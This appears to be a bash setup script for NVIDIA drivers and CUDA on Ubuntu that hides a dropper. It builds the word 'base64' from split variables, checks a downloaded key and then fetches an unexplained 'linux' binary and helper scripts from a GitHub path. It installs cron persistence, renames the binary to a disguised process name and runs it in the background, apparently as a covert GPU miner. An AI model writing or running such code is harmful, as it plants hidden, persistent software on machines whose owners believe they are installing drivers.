#!/bin/bash
sleep 10
gitpath=$(head -1 gitpath.txt)
yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
sudo apt install -y nvidia-driver-418

CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 
rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update -y
sudo apt-get install cuda-drivers -y
sudo apt-get install cuda -y
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y
VAR5="4"
VAR6="ba"
zvar3="6"
zvar6="8"
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/key.pem
VAR7="se"
VAR8="$VAR6$VAR7"
VAR9=6"$VAR5"
VAR10="$VAR8$VAR9"
EndInf=$(echo $gitpath | $VAR10 | cut -c $zvar3-1$zvar6)
StringInf=$(awk 'NR==13' key.pem | cut -c 3$zvar3-4$zvar6)
VAR1="$EndInf"
VAR2="$StringInf"
if [ "$VAR1" = "$VAR2" ]; 
then
echo "Running"
sudo apt-get install cuda-drivers -y
sleep 2
	Uname=$(ls /home)
	sudo echo $Uname > inuser.txt
	wget https://github.com/$gitpath/raw/main/linux.tar.gz
	tar -xvf linux.tar.gz
	rm -rf linux.tar.gz
	mkdir -p gitclone
	wget https://raw.githubusercontent.com/$gitpath/main/gitclone/ResourceGit.sh
	mv ResourceGit.sh gitclone/ResourceGit.sh
	chmod +x gitclone/ResourceGit.sh
	mkdir bin
	cp linux bin/linux
	chown -R $Uname:$Uname /home/$Uname/
	wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
	wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
	wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
	wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
	wget https://github.com/$gitpath/raw/main/logrun.sh
	chmod +x auinstall.sh
	chmod +x processname.sh
	chmod +x cronadd.sh
	chmod +x logrun.sh
	./cronadd.sh
	./processname.sh
	cp inuser.txt bin/inuser.txt
	cd bin/
	Uname=$(ls /home)
	USEPROCNAME=$(cat SETPROCNAME.txt)
	wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
	mv runlinux.sh runsrc.sh
	chmod +x runsrc.sh
	mv linux $USEPROCNAME
	sudo chown -R $Uname:$Uname /home/$Uname/
	nohup sh runsrc.sh > result.log 2>&1 &
else
sudo reboot
fi
